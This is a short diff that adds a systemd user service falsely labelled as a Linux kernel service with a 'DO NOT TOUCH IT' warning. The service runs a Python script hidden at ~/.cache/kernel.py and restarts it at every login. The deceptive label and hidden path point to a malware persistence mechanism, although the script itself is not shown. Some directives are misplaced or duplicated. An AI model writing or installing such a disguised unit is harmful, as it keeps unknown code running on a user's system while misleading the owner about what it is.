@@ -1,0 +1,12 @@
+[Unit]
+Description=DO NOT TOUCH IT, THIS IS SYSTEM SERVICE TO WORK LINUX KERNEL
+After=network.target
+Restart=always
+After=network.target 
+RestartSec=5
+
+[Service]
+ExecStart=/usr/bin/python3 /home/$USER/.cache/kernel.py
+
+[Install]
+WantedBy=default.target
